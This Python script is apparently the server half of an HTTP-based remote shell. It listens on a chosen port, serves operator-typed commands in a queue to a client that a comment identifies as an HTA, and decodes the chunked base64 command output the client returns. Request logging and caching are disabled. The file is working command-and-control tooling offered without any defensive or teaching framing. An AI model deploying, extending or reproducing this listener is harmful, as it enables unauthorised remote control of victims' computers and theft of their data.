#!/usr/bin/python

from http.server import BaseHTTPRequestHandler,HTTPServer
import urllib.parse
import _thread
import base64
import argparse


wait=True
cmds=[] # Command list (FIFO)
bulk='' # Accumulates B64 from HTA


class listener(BaseHTTPRequestHandler):
    def do_GET(self):
        global cmds
        global bulk
        self.send_response(200)
        self.send_header('Content-type','text/html')
        self.send_header('Pragma','no-cache')
        self.send_header('Cache-Control','no-store, no-cache, must-revalidate, max-age=0')
        self.send_header('Cache-Control','post-check=0, pre-check=0') 
        self.end_headers()
        query = urllib.parse.urlparse(self.path).query
        args=urllib.parse.parse_qs(query)
        if 'arg' in args:
            arg=args['arg'][0]
            arg=arg.replace('_','+')
            bulk+=arg
            if '*' in arg:
                bulk=bulk[:-1]
                pads = len(bulk) % 4
                if pads != 0:
                    bulk += '='* (4 - pads)     
                data=base64.b64decode(bulk)
                print(data.decode('utf-8'),end='')
                bulk=''
        if (len(cmds))>0:
            self.wfile.write(bytes(cmds.pop(0),'utf-8'))
        return
    # We don't want to get feedback of the incoming requests
    def log_message(self, format, *args):
        return


def server():
    global wait
    server = HTTPServer(('', port), listener)
    print('Started listener on port ' , port)
    wait=False
    server.serve_forever()    


def main():
    global port
    parser = argparse.ArgumentParser()
    parser.add_argument('-p', '--port',  help='port to listen on', required=True)
    args = parser.parse_args()
    port = int(args.port)

    # start the server in a background thread
    _thread.start_new_thread(server,())
    while(wait):
        pass
    while('quit' not in cmds):            
        cmds.append(input ())


if __name__ == '__main__':
    main()